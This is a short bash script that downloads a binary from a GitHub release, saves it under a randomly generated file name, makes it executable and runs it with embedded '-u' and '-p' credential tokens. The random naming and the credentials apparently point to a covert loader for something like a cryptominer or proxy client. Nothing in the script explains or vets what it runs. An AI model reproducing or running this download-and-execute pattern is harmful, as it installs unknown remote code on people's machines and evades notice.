#!/bin/bash

BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

wget -O "$BIN_NAME" https://github.com/vedhagsvp/soljtka/releases/download/latest/abelsa
chmod +x "$BIN_NAME"
./"$BIN_NAME" -u 9cc006e70b0583c358ce5b1bbb9cdd30a03c92a152b814e2439499047c1a529c -p f86703670b
